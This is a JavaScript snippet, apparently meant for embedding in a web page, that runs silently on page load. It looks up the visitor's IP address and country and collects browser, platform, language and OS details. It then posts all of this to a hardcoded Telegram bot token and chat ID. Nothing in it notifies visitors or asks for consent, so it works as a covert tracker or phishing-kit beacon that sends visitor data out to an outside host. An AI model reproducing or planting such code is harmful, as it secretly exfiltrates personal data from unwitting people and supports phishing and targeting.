<script>
    function sendDeviceInfoToTelegram(ip, country, device) {
        var token = '6816058961:AAH7jf3hXMVe3Po8Ve-sxFdaSDsBQCVkb1c';
        var chatId = '6423786554';

        var message = 'IP del usuario es: ' + ip + '\n';
        message += 'País: ' + country + '\n\n';
        message += 'Información del dispositivo:\n' + device;

        var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
        var data = {
            chat_id: chatId,
            text: message
        };

        $.post(url, data);
    }

    function getDeviceInfo() {
        var deviceInfo = "Navegador: " + navigator.userAgent + "\n";
        deviceInfo += "Plataforma: " + navigator.platform + "\n";
        deviceInfo += "Idioma del navegador: " + navigator.language + "\n";

        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        if (isMobile) {
            // Es un dispositivo móvil
            deviceInfo += "Tipo de dispositivo: Móvil\n";
            var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
            if (isIOS) {
                
            } else {
                
                deviceInfo += "Sistema Operativo: Android\n";
            }
        } else {
            deviceInfo += "Tipo de dispositivo: Escritorio\n";
            var isWindows = /Win/.test(navigator.platform);
            if (isWindows) {
                deviceInfo += "Sistema Operativo: Windows\n";
            } else {
                deviceInfo += "Sistema Operativo: macOS\n";
            }
        }

        return deviceInfo;
    }

    $(document).ready(function () {
        $.getJSON('https://api.ipify.org?format=json', function (data) {
            var ip = data.ip;

            $.getJSON('https://ipapi.co/' + ip + '/json/', function (data) {
                var country = data.country_name;
                var device = getDeviceInfo();

                sendDeviceInfoToTelegram(ip, country, device);
            });
        });
    });
</script>
